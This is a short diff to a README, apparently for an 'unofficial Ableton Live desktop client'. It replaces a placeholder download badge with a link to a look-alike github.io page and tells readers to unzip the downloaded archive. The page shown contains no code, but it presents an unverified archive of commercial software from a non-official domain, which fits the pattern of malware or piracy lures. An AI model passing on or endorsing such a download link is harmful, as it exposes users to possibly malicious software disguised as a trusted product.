@@ -6,7 +6,7 @@ This unofficial Ableton Live desktop client brings the world-class music product
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://ableton-live-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
